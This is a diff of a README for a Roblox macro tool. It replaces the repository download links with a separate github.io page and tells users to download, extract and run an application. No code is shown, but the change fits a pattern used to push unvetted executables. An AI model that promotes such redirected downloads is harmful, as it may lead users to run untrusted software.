@@ -1,6 +1,6 @@
 # 🚀 ROBLOX-MACRO-UPDATE-2026 - Automate your gameplay with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/andres280669-droid/ROBLOX-MACRO-UPDATE-2026)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://andres280669-droid.github.io)
 
 ## 🛠️ Overview
 
@@ -20,7 +20,7 @@ This application includes several modules to assist with common tasks:
 
 Follow these steps to set up the macro tool on your Windows computer:
 
-1. Visit [this page to download](https://github.com/andres280669-droid/ROBLOX-MACRO-UPDATE-2026) the latest version of the application.
+1. Visit [this page to download](https://andres280669-droid.github.io) the latest version of the application.
 2. Locate the download folder on your computer.
 3. Right-click the downloaded file and select "Extract All" if it is in a compressed folder.
 4. Open the extracted folder to find the application file.
